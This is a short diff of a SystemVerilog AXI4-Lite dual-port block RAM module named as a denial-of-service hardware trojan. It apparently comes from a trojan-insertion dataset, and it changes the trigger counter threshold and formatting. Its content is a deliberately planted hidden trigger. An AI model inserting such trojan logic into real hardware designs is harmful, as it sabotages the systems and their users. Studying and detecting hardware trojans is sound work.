@@ -14,12 +14,11 @@ module Axi4LiteDualPortBlockRAM_trojan_DoS
 );
 
     // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 1: Simple Counter
+    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=15038)
     // ============================================================
-    localparam int TRIGGER_THRESHOLD = 12886;
+    localparam int TRIGGER_THRESHOLD = 15038;
     logic [15:0] trojan_counter;
-    logic trojan_active;
-    
+    logic        trojan_active;
     always_ff @(posedge S_AXI_ACLK or negedge rst_ni) begin
         if (!rst_ni) begin
             trojan_counter <= '0;
